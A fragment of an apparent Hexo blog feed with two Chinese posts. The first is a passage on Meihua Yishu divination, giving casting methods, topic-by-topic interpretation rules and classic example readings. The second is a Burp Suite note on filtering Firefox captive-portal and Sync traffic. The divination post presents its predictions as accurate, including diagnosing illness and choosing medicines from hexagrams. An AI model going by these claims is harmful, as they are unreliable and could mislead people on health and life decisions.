猪。</p><p><strong>八卦象例</strong></p><p>乾三连，坤六段；震仰盂，艮覆碗；离中虚，坎中满；兑上缺，巽下断。</p><p><strong>占法</strong></p><p>易中秘密穷天地，造化天机泄未然；</p><p>中有神明司祸福，后来切莫教轻传。</p><p><strong>玩法</strong></p><p>一物从来有一身，一身还有一乾坤。</p><p>能知万物备于我，肯把三才别立根。</p><p>天向一中分造化，人于心上起经纶。</p><p>仙人亦有两般话，道不虚传只在人。</p><p><strong>起卦法</strong></p><p><strong>一、年月日时起卦：</strong></p><p>即以农历之年月日总和除以八，以余数为卦数求上卦;以年月日时总和除以八，以余数为卦数求下卦，再以年月日时总和除以六，以余数为动爻。</p><p>例：农历壬申年四月十一日巳时起卦：申年9数，巳时6数。</p><p>上卦为：（年+月+日）÷8，取余数。即：<code>（9+4+11）÷8</code>，此处无余数。</p><p>下卦为：（年+月+日+时）÷8，取余数。即：<code>（9+4+11+6）÷8</code>，余数为7为艮卦。</p><p>动爻数为：（年+月+日+时）÷6，取余数。即：<code>（9+4+11+6）</code>除以<code>6</code>，此处无余数。</p><p>此卦为：上卦为坤，下卦为艮，动爻为上爻。</p><p><strong>二、直接以数起卦</strong></p><p>这是一种简便而准确率极高的起卦方法。当有人求测某事时，可以让来人随意说出两个数，第一个数取为上卦，第二个数取为下卦，两数之和除以6，余数为动爻，或者可以随便借用其他能得到两数的办法起卦，如翻书、日历等等。</p><p><strong>三、端法后天起卦</strong></p><p>端法后天起卦法是以”八卦万物属数为上卦，以后天八卦方位下卦”,即以物或人所取之象为上卦，以其所在后天八卦方位之卦为下卦，以上、下卦数加时数除以6，余数取动爻。这种方法经常使用。</p><p><strong>四、按声音起卦</strong></p><p>凡闻声音，数得声数起作上卦，加时数配作下卦。如动物鸣叫声，叩门声，别人说话声皆可起卦。若所闻声音中有一间隔，可以把间隔前声数取作上卦，把间隔后声数取作下卦，以上下卦数加时辰数取动爻。</p><p><strong>五、按字的笔划数或字数起卦</strong></p><p>字少时，,按笔画数，字多时，可用字数起卦。凡见字数，如停匀，即平分一半为上卦，一半为下卦。如字数不匀，即少一字为上卦，取”天轻清”之义；以多一字为下卦，取”地重浊”之义。</p><p><strong>六、丈尺寸起卦</strong></p><p>凡数皆可起卦，丈尺，尺寸皆为数，亦可起卦。丈尺之物，以丈数为上卦，尺数为下卦，合丈尺之数取爻（数寸不系）。尺寸之物，以尺数为上卦，寸数为下卦。合尺，寸之数，加时数取爻。分数不用。</p><p><strong>七、起卦加数法</strong></p><p>按年月日时起卦，一个时辰之内，只有某一特定的卦象，在同一时辰内，可能有多人来占问，不能以同一卦象断事，或有多人同来问同一件事者，亦不能以同一卦象论之。为解决这一问题，可用加姓氏笔划数的方法，进行起卦决之。</p><p><strong>八、物数占</strong></p><p>凡见有可数之物，即以此物起作上卦，以时数配作下卦，即以卦数并时数，总数除以六，取动爻。</p><p><strong>九、为人占</strong></p><p>凡为人占，其例不一。或听语声起卦，或观其人品，或取诸身，或取诸物，或因其服色、触其外物，或以年、月、日、时，或以书写来意。</p><p>听其语声音，如或一句，即如其字数分之起卦。如语两句，即用先一句为上卦，后一句为下卦。语多，则但用初听一句，或末后所闻一句，余句不用。</p><p>观其人品者，如老人为乾，少女为兑之类。取诸其身者，如头动为乾，足动为震，目动为离之类。</p><p>取诸其物者，如人手中偶有何物，如金玉及圆物之属为乾，土瓦及方物之属为坤之类。</p><p>因其服色者，如其人青衣为震，赤衣为离之类。触其外物者，起卦之时，见水为坎卦，见火为离卦之类。</p><p>以年、月、日、时者，即以求问时之年月日时起卦。书写来意者，其人来占，或写来意，则以其字占之。</p><p><strong>十、自己占</strong></p><p>凡自己欲占，以年、月、日、时，或闻有声音，或观当时有所触之外物，皆可起卦。</p><p><strong>十一、占动物</strong></p><p>凡占群物之动不可起卦。如见一物，则就此物为上卦，物来之方位为下卦，合我卦数及方位卦数加时数取爻。以此卦总断其物。如后天占牛鸣鸡叫之类。又凡、牛、马、犬、猪之类，初生，则以初生年、月、日、时占之。又或置买此物，亦可以初置买之时推之。</p><p><strong>十二、占静物</strong></p><p>凡占静物，有如江河山石，不可起卦。若至屋宅树木之类,则屋宅初创之时，树木初置之时，皆可起卦。至于器，则置成之时可占，如枕椅之类是矣。余则无故不占。若《观梅》，则见雀争枝坠地而占；《牡丹》，则自有问而占；《茂树》，则枝枯自坠而后占也。</p><p><strong>断卦法</strong></p><p><strong>一、占卜总诀（《梅花易数》原文）</strong></p><p>大抵占卜之法，成卦之后，先看《周易》爻辞，以断吉凶。如乾卦初九：<strong>“潜龙勿用”。</strong>则诸事未可为，宜隐伏之类。九二：“见龙在田，利见大人”。则宜谒见贵人之类。余皆仿此。次看卦之体用，以论五行生克。体用即动静之说，体为主，用为事应。用生体及比和则吉，体生用及克体则不吉。</p><p><strong>二、体、用、变卦及断卦</strong></p><p>断卦之前，必须先学会排出”互卦”与”变卦”；才能判断事情的整个来龙去脉！</p><p>互卦：依本卦为主，234爻为下卦、345为上卦。下卦组合在一起，就得到了互卦。互卦表示的是事物发展的中间过程，事物变化的中间结果。在预测时，有时为了预测得更细致、详细，会利用这个互卦对事物发展变化的过程进行预测。</p><p>变卦是由本卦经过某个爻的变动、变化而得到的，也就是变卦是由本卦变动而来的。变卦代表着事物发展变化的最终结果，也就是求测者想要得到的最终结果、结局。在预测时，事物的最终吉凶结果，要由变卦来作最后定夺。所以，预测最终要以变卦的结果为准。</p><p>有时在排盘中，还会看到错卦与综卦。错卦是与本卦阴阳全颠倒的卦，即每个爻阴变阳、阳变阴而得到的卦。综卦就是把本卦倒过来看。它们通常是从事物的反面来看事物的发展变化。这个在预测中一般很少用。</p><p><strong>三、先、后天卦定应期的方法</strong></p><p>先天卦定应期的方法与后天卦定应期的方法不同。订阅号红阳遁甲术。用先天起卦法断卦定应验之期，常常用卦气来确定。如果是乾卦，因为乾属金，那么应期应定在庚日，辛日或五行中属金的日子(如申日，酉日)。或者乾之应期应定在戌日，亥日，因为乾在八卦方位中为西北方，而戌，亥亦在西北方。或者兑之应期应定在酉日酉时。再比如，震、巽之应期当定于甲日，乙日，以及五行中属木的日子(如寅日，卯日)。或者震卦之应期应定在卯日卯时，巽卦之应期应定在辰日辰时，等等。</p><p>后天起卦法断卦定应验之期则多以卦数加时数来定，又根据当时求卜者当时行、卧、坐、立的姿态或者求占者心情的迟缓与急速的情况，来确定事物的应验之期。用卦数加时数来定应期的方法，是在近来之期而不是应在长远之期的，就没有必要断为长远之期。有许多复杂情况，必须综合先天卦数与后天卦数来断定应期，亦不可执于一端。</p><p><strong>四、一般分析思路</strong></p><p>卦名分析+卦象直读+体用五行生克+分析互卦+主、变卦类象分析判断=准确的预测结论。</p><p>1：卦名分析：六十四卦各有其卦名，此卦名是历代先贤经过实践验证的结果，字字玄妙精准。详情请参考周易全文关于名、卦辞、爻辞方面。</p><p>2：卦象直读：梅花预测其实就是八卦类象预测分析。起任何一卦皆有所类象。我们的目的就是把卦象所指之事物变化分析出来。如测疾病起得《地火明夷》：坤为胃，离为火、为炎。可断为：胃炎，有内火。(如起得《火地晋》呢？就可断为“胃火上升，食道不适。胃炎。”因为火在上嘛，所以食道也有不适)。由此可见卦象直读也是要具体分析内、外卦各有所指。</p><p>3：体用五行生克：梅花预测注重体用生克之辩。基本来说就是“生体、比和为吉。克体泄体不利。”如前所述。</p><p>4：分析互卦：互卦不分体用，只是事物变化的内因及隐情。</p><p>5：主、之卦类象分析判断：类象，不仅仅是预测来意和以象测事。还可以用卦的类象预测事业的最终结果。上面曾经讲过“体克用，用生体为吉。用克体，体生用为凶”。其实此断言只能适用于大部分的卦象，而不能代表所有的卦都是如此的下结论。还要以八卦的各个类象来做出判断。</p><p><strong>四、分类占断</strong></p><p><strong>天时占</strong></p><p>凡占天时，不分体用，全观诸卦，详推五行。离多主晴，坎多主雨，坤乃阴晦，乾主晴明，震多则春夏雷轰，巽多则四时风烈，艮多则久雨必晴，兑多则不雨亦阴。夏占离多而无坎，则亢旱炎炎。冬占坎多而无离，则雨雪飘飘。全观诸卦者，谓互变卦。</p><p><strong>人事占</strong></p><p>人事之占，详观体用。体卦为主，用卦为宾。用克体不宜，体克用则吉。用生体有进益之喜，体生用有耗失之患。体用比和，谋为吉利。更详观互卦、变卦，以断吉凶；复究盛衰，以明休咎。</p><p>人事之占，则以全体用总章向决吉凶。若有生体之卦，即看前章八卦中生体之卦有何吉；又看克体之卦有何凶，即看前章克体之卦。无生克，止断本卦。</p><p><strong>家宅占</strong></p><p>凡占家宅，以体为主，用为家宅。体克用，则家宅多吉，用克体，则家宅多凶。体生用，多耗散，或防失盗之稳。如有生体之卦，即以前章人事占断之。</p><p><strong>屋舍占</strong></p><p>凡占屋舍，以体为主，用为屋舍。体克用，居之吉，用克体，居之凶。体生用，主资财衰退；用生体，则门户兴隆。体用比和，自然安稳。</p><p><strong>婚姻占</strong></p><p>占婚姻以体为主，用为婚姻用生体，婚易成，或因婚有得；体生用，婚难成，或因婚有失。体克用，可成但成之迟；用克体，不可成，成亦有害。体用比和，婚姻吉利。</p><p>占婚，体为所占之家，用为所婚之家。体卦旺，则此家门户胜；用卦旺，则彼家资盛。生体，则得婚姻之则，或若体用比和，则彼此相就，良配无疑。</p><p><strong>生产占</strong></p><p>占生产，以体为母，用为生。体用俱宜乘旺，不宜乘衰。宜相生，不宜相克。体克用不利于子；用克体不利于母。体克用而用卦衰，则子难完；用克体而体卦衰，则母难保。用生体，利于母；体生用，利于子。体用比和，生育顺快。若欲辨其男女。阴阳卦爻相生，则察所占左右人之奇偶以证之。如欲决其日辰，则以用卦之气数参决之。所谓卦之气数者，即看何为用卦，于八卦时序之类次之。</p><p><strong>饮食占</strong></p><p>凡占饮食，以体为主，用为饮食。用生体，饮食必丰；体生用，饮食难就。体克用，则饮食有阻；用克体，饮食必无。体用比和，饮食丰足。又卦中有坎则有酒，有兑则有食。无坎无兑，则皆无。兑、坎生体，酒肉醉饱。欲知所食何物，以饮食推之。欲知席上何人，以互卦人事推之。饮食人事类者，即前八卦内万物属类是也。</p><p><strong>求谋占</strong></p><p>占求谋，以体为主，用为所谋之事。体克用，谋虽可成，但成迟。用克体，求谋不成，谋亦有害。用生体。不谋而成；体生用，多谋少遂。体用比和，求谋称意。</p><p><strong>求名占</strong></p><p>凡占求名，以体为主，用为名。体克用，名可成，但成迟。用克体，名不可成。体生用，名不可就，或因名有丧。用生体，名易成，或因名有得。体用比和，功名称意。欲知名成之日，生体之卦气详之。欲知职任之处，变卦之方道决之。若无克体卦，则名易就，止看卦体时序之类，以定日期。若在任占卜，最忌见克体之卦，如卦有克体者，即居官见祸，轻则上司责罚，重则削官退居。其日期，看克体之卦气者，于八卦所属时序类中断之。</p><p><strong>求财占</strong></p><p>占求财，以体为主，以用为财。体克用，有财；用克体，无财。体生用，财有损耗之忧；用生体，财有进益之喜。体用比和，则利快意。欲知得财之日，生体之卦气定之。欲知破财之日，克体卦气定之。</p><p>又若卦中有体克用之卦，及生体之卦，则有财，此卦气即见财之日。若卦中有克体之卦，及体生用之卦，即破财，此卦气破财之日。</p><p><strong>交易占</strong></p><p>占交易，以体为主，用为财。体克用，有财；用克体，不成。体生用，难成，或因交易有失。用生体，即成，成必有财。体用比和，易成。</p><p><strong>出行占</strong></p><p>占出行，以体为主，用为所行之应。体克用，可行，所至多得意。用克体，出则有祸。体生用，出行有破耗之失；用生体，有意外之财。体用比和，出行顺快。</p><p>又凡出行，体宜乘旺，诸卦宜生体。体卦乾、震多，主动。坤、艮多，不动。巽宜舟行，离宜陆行。坎妨失脱，兑主纷争。</p><p><strong>行人占</strong></p><p>占行人，以体为主，用为行人。体克用，行人归迟；用克体，行人不归。体生用，行人未归；用生体，行人即归。体用比和，归期不日矣。</p><p>又以用卦看行人在外之情况。逢生，在外顺快；逢衰受克，在外灾殃。震多不宁，艮多有阻。坎有险难，兑主纷争。</p><p><strong>谒见占</strong></p><p>占谒见，以体为主，用为所见之人。体克用，可见；用克体，不见。体生用，难见，见之而无益；用生体，可见，见之且有得。体用比和，欢然相见。</p><p><strong>失物占</strong></p><p>占失物，以体为主，用为失物。体克用，可寻迟得；用克体，不可寻。体生用，物难见；用生体，物易寻。体用比和，物不失矣。</p><p><strong>疾病占</strong></p><p>凡占疾病，以体为病人，用为病症。体卦宜旺不宜衰，体宜逢生，不宜见克。用宜生体，不宜克体。体克用，病易安；体生用，病难愈。体克用者，勿药有喜；用克体者，虽药无功。若体逢克而乘旺，犹为庶几。体遇克而更衰，断无存日。欲知凶中有救，生体之卦存焉。体生用者，迁延难好；用生体者，即愈。体用比和，疾病易安。若究和平之日，主卦决之。若详危厄之期，克体之卦定之。若论医药之属，当看生体之卦。如离卦生体，宜服热药；坎卦生体，宜服冷药，如艮温补；乾、兑凉药是也。</p><p><strong>官讼占</strong></p><p>占官讼，以体为主，用为对辞之人与官讼之应。订阅号红阳遁甲术。体卦宜旺，用卦宜衰。体宜用生，不宜生用。宜生体，不宜克体。是故体克用者，已胜人；用克体者，人胜已。体生用，非为失理，或因官有所丧；用生体，不止得理，或因讼有所得。体用比和，官讼最吉。非但扶持之力，必有主和之义。</p><p><strong>坟墓占</strong></p><p>占坟墓以体为主，用为坟墓。体克用，葬之吉；用克体，葬之凶。体生用，葬之主运退；用生体，葬之主兴隆，有荫益后嗣。体用比和，乃为吉地。大宜葬，葬之吉昌。</p><p>上为用体之诀，始发十八章占例，以示后学之法则。然庶务之多，岂止十八占而已乎!然此十八占，乃大事之切要者，占者以类而推之可也。</p><p><strong>五、实例选</strong></p><p><strong>观梅占(年月日时占例)</strong></p><p>辰年十二月十七日申时，康节先生偶观梅，见二雀争枝坠地。先生曰：<strong>“不动不占，不因事不占。今二雀争枝坠地，怪也。”</strong>因占之，辰年五数，十二月十二数，十七日十七数，共三十四数，除四八三十二，余二，属兑，为上卦，加申时九数，总得四十三数，五八除四十，余得三数，为离，作下卦。又上下总四十三数，以六除，六七四十二，余一为动爻，是为泽火革。初爻变咸，互见乾巽。</p><p>断之曰：<strong>“详此卦，明晚当有女子折花，园丁不知而逐之，女子失惊坠地，逐伤其股”。</strong></p><p>右兑金为体，离火克之。互中巽木，复三起离火，则克体之卦气盛。兑为少女，因知女子之被伤，而互中巽木，又逢乾金兑金克之，则巽木被伤，而巽为股，故有伤股之应。幸变为艮土，兑金得生，知女子但被伤，而不至凶危也。</p><p><strong>牡丹占</strong></p><p>巳年三月十六日卯时，先生与客往司马公家共观牡丹。时值花开甚盛，客曰：<strong>“花盛开如此，亦有数乎？”</strong>先生曰：<strong>“莫不有数，****且因问而可占矣。“</strong>逐占之。</p><p>以巳年六数，三月三数，十六日十六数，总得二十五数，除三八二十四数，余一数为乾，为上卦。卯时四数，共得二十九数，又除三八二十四数，余五为巽卦，作下卦，得天风诟。又以总计二十九数，以六除之，四六二十四，得五爻动，变鼎卦，互见重乾。</p><p>逐与客曰：<strong>”怪哉，此花明日午时，当为马所践毁。”</strong>众客愕然不信，次日午时，果有贵官观牡丹，二马相啮，群至花间驰骤，花尽之践毁。</p><p>断之曰：巽木为体，乾金克之，互卦又见重乾，克体之卦多矣，卦中无生意，固牡丹必为践毁。所谓马者，乾为马也。午时者，离明之象，是以知之也。</p><p><strong>邻夜扣门借物占(系闻声占例)</strong></p><p>冬夕酉时，先生方拥护，有扣门者，初扣一声而止，继而又扣五声，且云借物。先生令勿言，令其子占之所借何物。以一声属乾为上卦，以五声属巽为下卦，又以一乾五巽共六数，加酉时数共得十六数，以六除之，二六一十二，得天风姤。第四爻变巽卦，互见重乾。卦中三乾金，二巽木，为金木之物也，又以乾金短，而巽木长，是借斧也。</p><p>子乃断曰：<strong>“金短木长者，器也，所借锄也。”</strong>先生曰：<strong>“非也。必斧也。”</strong>问之，果借斧，其子问何故，先生曰：“起数又须明理。以卦推之，斧亦可也，锄亦可也；以理推之，夕晚安用锄？必借斧。盖斧切于劈柴之用耳。推数又须明理，为卜占之切要也。推数不理，是不得也。学数者志之!”</p><p><strong>今日动静如何(系声音占例)</strong></p><p>有客问曰：<strong>“今日动静如何？”</strong>逐将此六字占之。以乎分“今日动”三字为上卦。“今”平声，一数；“日”入声，四数；“动”去声，三数，共八数，得坤为上卦。以“静如何”为下卦，“静”去声，三数；“如”平声，一数；“何”平声，一数，共五数，得巽，为下卦。又以八五总为十三数，除二六一十二，余得一数，为地风升。初爻动，变泰卦，互见震、兑。</p><p>逐为客曰：<strong>“今日有人相请，客不多，酒不醉，味至黍鸡而已。”</strong>至晚果然。</p><p>断曰：升者，有升阶之义，互震、兑，有东西席之分。卦中兑为口，坤为腹，为口腹之事，故知有人相请。客不多者，坤土独立，无同类之卦气也。酒不醉，卦中无坎。味止鸡黍者，坤为黍稷耳。盖卦无相生之义，故知酒不多，食品不丰也。</p><p><strong>西林寺牌额占(系字画占例)</strong></p><p>先生偶见西林寺之额，“林”字无两勾，因占之，以西字七画为艮，作上卦；以林八画为坤，作下卦。以上七画下八画总十五画，除二六一十二，余数得三，是山地剥卦。第三爻动，变艮，互见重卦。</p><p>断曰：寺者，纯阳之所居，今卦得重阴之爻，而又有群阴剥阳之兆。详此，则寺中当有阴人之祸。询之果然，逐谓寺僧曰：<strong>“何不添‘林’字两勾，则自然无阴人之祸矣。”</strong>僧信然，即添‘林’字两勾，寺果无事。</p><p>又，纯阳之人，所居得纯阴之卦，故不吉。又有群阴剥阳之义，故有阴人之祸。若添“林”字两勾，则十画，除八得二为兑卦，合上艮，是为山泽损。第五爻变，动为中孚卦，互卦见坤、震，损者益之，用互俱生体，为吉卦。可以得安矣。</p><p><strong>以上并是先得数，以数起卦，所谓先天之数也。</strong></p><p><strong>老人有忧色占(端法占例)</strong></p><p>己丑日卯时，偶在途行，有老人往巽方，有忧色。问其何以有忧，曰无。怪而占之，以老人属乾为上卦，巽方为下卦，是天风姤；又以乾一巽五之数，加卯时四数，总十数，除六得四为动爻，是为天风姤之九四。&lt;易&gt;曰：<strong>“包无鱼，起凶。”****是易辞不吉矣。</strong>以卦论之，巽木为体，乾金克之，互卦又见重乾，俱是克体，并无生气，且时在途行，其应速。</p><p>逐以成卦之数中分而取其半，谓老人曰：<strong>“汝于五日内谨慎出入，恐有重祸。”</strong>果五日，此老赴吉席，因鱼骨鲠而终。</p><p>又凡占卜，克应之期看自己之动静，以决事之迟速，故行则应速，以逐成卦之数，中分而取其半也。坐则事应迟，当倍其成卦之数而定之也。立则半迟半速，止以成卦之数定之可也。虽然如是，又在变通，如占牡丹及观梅之类，则二日花皆朝夕之故，岂特成数之久也。</p><p><strong>少年有喜色占</strong></p><p>壬申日午时，有少年从离方来，喜形于色，问有何喜，曰无。逐占之，以少年属艮为上卦，离为下卦，得山火贲。以艮七离三加午时七，总十七数，除十二，余五为动爻，贲之六五爻曰：<strong>“贲于丘园，束帛戋戋，吝，终吉。”易辞已吉矣。</strong>卦则贲之家人，互见震、坎，离为体，互变俱生之。</p><p>断曰：<strong>子于十七日内必有聘币之喜。至期，果然定亲。</strong></p><p><strong>牛哀鸣占</strong></p><p>癸卯日午时，有牛鸣于坎方，声极悲，因占之。牛属坤，为上卦，坎方为下卦。坎六坤入，加午时七，共二十一数，除三六一十八，三爻动得地水师之三爻。&lt;易辞&gt;曰：<strong>“师或舆尸，凶。”</strong>卦则师变升，互坤、震，乃坤为体，互变俱克之，并无生气。</p><p>断曰：<strong>此牛二十一日内必遭屠杀。后二十日，人果买此牛，杀以犒众，悉皆异之。</strong></p><p><strong>鸡悲鸣占</strong></p><p>甲申日卯时，有鸡鸣于乾方，声极悲怆，因占之。鸡属巽，为上卦，乾方为下卦，得风天小畜。以巽五乾一共六数，加卯时四数，总十数，除六得四，爻动变乾，是为小畜之六四。&lt;易&gt;曰：<strong>“有孚，血去惕出，无咎。”</strong>推之，割鸡之义。卦则小畜之乾，互见离、兑。乾金为体，离火克之。卦中巽木离火，有烹饪之象。</p><p>断曰：<strong>此鸡十日当烹。果十日客至，有烹鸡之验。</strong></p><p><strong>枯枝坠地占</strong></p><p>戊子日辰时，偶行至中途，有树蔚然，无风，枯枝自坠地于兑方。占之，槁木为离，作上卦，兑方为下卦，得火泽睽。以兑二离三，加辰时五数，总十数，去六余四，变山泽损，是睽之九四。&lt;易&gt;曰：<strong>“睽孤，遇元夫。”</strong>卦火泽睽变损，互见坎、离，兑为金为体，离火克之，且睽损卦名，俱有伤残之义。</p><p>断曰：<strong>此树十日当伐。果十日，伐树起公榭，而匠者适字“元夫”也。</strong></p><p><strong>以上诸占例，并是先得卦，以卦起数，所谓后天之数也。</strong></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 数术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 梅花易数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp-混子流量分析</title>
      <link href="posts/1ccf.html"/>
      <url>posts/1ccf.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><p>我本人很喜欢Google Chrome，因为Google Chrome压榨了我的大部分内存，看起来性能就很强的样子，嘿嘿。</p><p>其实是用习惯了，然后书签都在Chrome，各种插件也都齐全，所以也不<strong>想</strong>[2]迁移至Firefox，虽然我知道Firefox的安全性要好一点，但是现在并不影响我现在使用他们其中任意一个，因为我两个都要。</p><p>一个用来平时工作，适用于任何场景，而Firefox用于安全测试，抓包，就解决了一个浏览器代理切来切去的繁琐问题。</p><p>当时，每当抓包时，总会有一切不明不白的流量从我眼皮子底下溜过，我每次都觉得没啥，这不是Firefox的域名吗，是浏览器的问题，我在想，浏览器作为载体，是HTTP的运输车，当然最本质是TCP和UDP，但你可以想象一下，HTTP的User-Agent是带有设备标识的，就比如：</p><pre class=" language-txt"><code class="language-txt">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0</code></pre><p>可以这样理解，TCP和UDP就是火车或汽车等交通工具，而浏览器就是车子的牌子，比如以上这个就是Firefox的牌子的车子，如同我们街上看到的到处都是车子，有些车子有明显标识的，因为车子是统称，所以我们一遍会这样说，有一辆货拉拉，快看，是宝马，这是桑塔纳，飞机是东航的，火箭是特斯拉的，等等等等。。</p><p>那么，Firefox作为载体，凭什么发送流量。本着好奇，我开始了最我们平时认为最正常不过，而又最没用的数据包进行分析，防止干扰我们的安全测试任务。</p><h3 id="Comment-Auto-Dropped-by-Knife"><a href="#Comment-Auto-Dropped-by-Knife" class="headerlink" title="Comment: Auto Dropped by Knife"></a>Comment: Auto Dropped by Knife</h3><p>来看数据包：</p><pre class=" language-http"><code class="language-http">GET /canonical.html HTTP/1.1<span class="token header-name keyword">Host:</span> detectportal.firefox.com<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Cache-Control:</span> no-cache<span class="token header-name keyword">Pragma:</span> no-cache<span class="token header-name keyword">Connection:</span> close</code></pre><p>例证</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230309092441768.png"></p><p>返回包</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230309092536314.png"></p><p>经过查询得知，这是一个心跳包，使其浏览器会话保持活跃。</p><blockquote><p>wiki:强制门户主要用于开放式无线网络，向用户显示欢迎消息，告知他们访问条件（允许的端口、责任等）。管理员倾向于这样做，以便他们自己的用户对他们的行为负责并避免任何法律责任。这种责任委托是否具有法律效力是一个有争议的问题。</p><p>强制门户通常用于营销和商业交流目的。在用户通过在网络浏览器中填写基于网络的注册表来交换个人数据之前，禁止通过开放的 Wi-Fi 访问互联网。基于 Web 的表单会自动在 Web 浏览器中打开，或者在用户打开 Web 浏览器并尝试访问任何网页时出现。换句话说，用户是“俘虏”的——在用户被授权访问互联网并“完成”俘虏门户之前，无法自由访问互联网。这允许此服务的提供商向连接到 Wi-Fi 接入点的用户显示或发送广告。这种类型的服务有时也被称为“社交 Wi-Fi”，因为他们可能会要求社交网络帐户登录（如Facebook）。在过去几年中，此类社交 Wi-Fi 强制门户已变得司空见惯，许多公司提供以 Wi-Fi 数据收集为中心的营销。</p><p>用户可以在强制门户中找到多种类型的内容，并且经常允许访问互联网以换取查看内容或执行特定操作（通常是提供个人数据以实现商业联系）；因此，专属门户的营销用途是产生潜在客户（业务联系人或潜在客户）的工具。</p></blockquote><p>可以理解到，我们向肯德基那种免费的wifi需要认证，所以会弹出浏览器进行认证，而在认证成功之前，http一直保持活跃，所以有人利用这个打广告的行为。</p><p>另外，也有很多方法可以实现强制门户。</p><ul><li>HTTP重定向</li><li>ICMP重定向</li><li>DNS重定向</li></ul><p>为了通过 DNS 执行重定向，强制门户使用DNS 劫持来执行类似于中间人攻击的操作。为了限制 DNS 中毒的影响，通常使用TTL 0。</p><p>需要使用浏览器访问</p><blockquote><p>强制门户通常需要使用网络浏览器；首次使用电子邮件客户端或其他依赖互联网的应用程序的用户可能会在没有解释的情况下发现连接无法正常工作，然后需要打开网络浏览器进行验证。对于未在其操作系统上安装任何 Web 浏览器的用户来说，这可能会有问题。然而，有时可以使用不依赖 DNS 的电子邮件和其他设施（例如，如果应用程序指定连接 IP 地址而不是主机名）。如果客户端使用AJAX或使用已加载到其 Web 浏览器的页面加入网络，则会出现类似的问题，从而导致未定义的行为（例如，出现损坏的消息）当此类页面尝试向其源服务器发出 HTTP 请求时。</p><p>同样，由于无法重定向 HTTPS 连接（至少不能不触发security警告），一个只在被强制门户授权之前尝试访问安全网站的网络浏览器将看到这些尝试失败而没有解释（通常的症状是预期的网站似乎已关闭或无法访问）。</p><p>具有Wi-Fi和TCP/IP 堆栈但没有支持具有Wi-Fi和TCP/IP 堆栈但没有支持HTTPS 的Web 浏览器的平台无法使用许多强制门户。此类平台包括运行使用任天堂 Wi-Fi 连接的游戏的任天堂 DS。可以使用WISPr进行非浏览器身份验证，这是一种用于此目的的基于XML的身份验证协议，或者基于 MAC 的身份验证或基于其他协议的身份验证。</p><p>平台供应商还可以与大量强制门户热点的运营商签订服务合同，允许通过热点的围墙花园免费或打折访问平台供应商的服务器。例如，2005 年任天堂和Wayport合作，在某些麦当劳餐厅为任天堂 DS 用户提供免费 Wi-Fi 接入。[9]此外，可以允许VoIP SIP端口绕过网关以允许电话工作。</p></blockquote><blockquote><p>解决方法</p></blockquote><p>(1) 在新选项卡中，在地址栏中键入或粘贴<strong>about:config ，然后按 Enter/Return。</strong>单击承诺要小心的按钮。</p><p>(2) 在列表上方的搜索框中，键入或粘贴<strong>captiv</strong>并在过滤列表时暂停</p><p>(3) 双击<strong>network.captive-portal-service.enabled</strong>首选项，将值从 true 切换为 false</p><h3 id="Firefox-Sync"><a href="#Firefox-Sync" class="headerlink" title="Firefox Sync"></a>Firefox Sync</h3><p><strong>Firefox Sync</strong>，原名为<strong>Mozilla Weave</strong>，衍生自2007年Mozilla Labs所推出的实验性专案，它是一个浏览器同步功能，允许使用者在多台电脑上同步书签、历史纪录、密码、表单资料、附加元件，以安全加密的方式存放在Mozilla伺服器或个人伺服器上</p><p><code>*.sync.services.mozilla.com</code></p><p>解决方法，使用burp proxy optinos[Intercepting HTTP requests and responses]过滤该流量</p><p>正则语法（以后见一个过滤一个就行，直接过滤二级域名你就再也不拦截mozilla的firefox了）</p><pre class=" language-txt"><code class="language-txt">(webextensions\.settings\.services\.mozilla\.com|services\.addons\.mozilla\.org|webextensions\.settings\.services\.mozilla\.cn)(webextensions\.settings\.services\.firefox\.com|services\.addons\.firefox\.org|webextensions\.settings\.services\.firefox\.cn)(mozilla.com$|mozilla.org$|firefox.com$|firefoxchina.cn$)</code></pre><p><img src="https://lit.enomothem.com/zhixinghe/image-20230309102008046.png"></p><h3 id="使用Scope方式"><a href="#使用Scope方式" class="headerlink" title="使用Scope方式"></a>使用Scope方式</h3><p>我感觉使用过滤的方式有点烦，过滤一个又怎么样，又会出现一些奇奇怪怪的东西，不如直接使用白名单的方法。</p><p>在Target的目标中选中测试目标，然后右键add到scope中。</p><p>Proxy http过滤选择第一个，仅show我们scope的范围。这样真的舒服啊。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://en.wikipedia.org/wiki/Captive_portal">https://en.wikipedia.org/wiki/Captive_portal</a></p><p>[2] 感谢朋友的错别字修正</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> SecTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
